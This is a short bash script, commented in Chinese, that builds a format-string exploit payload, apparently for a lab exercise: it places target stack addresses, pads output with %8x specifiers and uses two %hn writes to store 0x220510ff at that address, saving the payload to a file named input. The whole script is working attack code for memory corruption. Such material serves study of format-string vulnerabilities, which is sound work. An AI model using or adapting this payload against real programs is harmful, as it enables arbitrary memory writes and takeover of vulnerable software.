#!/bin/bash

# 目标地址
ADDR="\x64\xe9\xff\xbf"
ADDR_PLUS_2="\x66\xe9\xff\xbf"

# 写入的目标值（0x220510ff）
# 低2字节和高2字节
LOW_BYTES=$((0x10ff))  # 4351 
HIGH_BYTES=$((0x2205)) # 8709

# 计算已经输出的字节数
# 3个地址共12字节 + 8个%8x格式符（每个输出8字节）= 12 + 8*8 = 76
ADDR_SIZE=12
FORMATTERS_OUTPUT=$((8 * 8))  # 8个%8x，每个输出8个字符
BASE_OUTPUT=$((ADDR_SIZE + FORMATTERS_OUTPUT))

# 计算填充所需的数值
LOW_PADDING=$((LOW_BYTES - BASE_OUTPUT))
# 如果低字节值小于已输出字节，需要增加一个周期 (0x10000)
if [ $LOW_PADDING -lt 0 ]; then
    LOW_PADDING=$((LOW_PADDING + 0x10000))
fi

# 计算高2字节的增量（从低字节写入后到高字节所需增加的数值）
INCREMENT=$((HIGH_BYTES - LOW_BYTES))
# 如果高字节小于低字节，需要增加一个周期
if [ $INCREMENT -lt 0 ]; then
    INCREMENT=$((INCREMENT + 0x10000))
fi

# 构造格式化字符串，遵循参考示例的格式
echo $(printf "${ADDR}${ADDR}${ADDR_PLUS_2}").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x%.${LOW_PADDING}u%%hn%.${INCREMENT}u%%hn > input

# 显示最终生成的命令（不执行）以便检查
echo "生成的命令:"
echo "echo \$(printf \"${ADDR}${ADDR}${ADDR_PLUS_2}\").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x%.${LOW_PADDING}u%hn%.${INCREMENT}u%hn > input"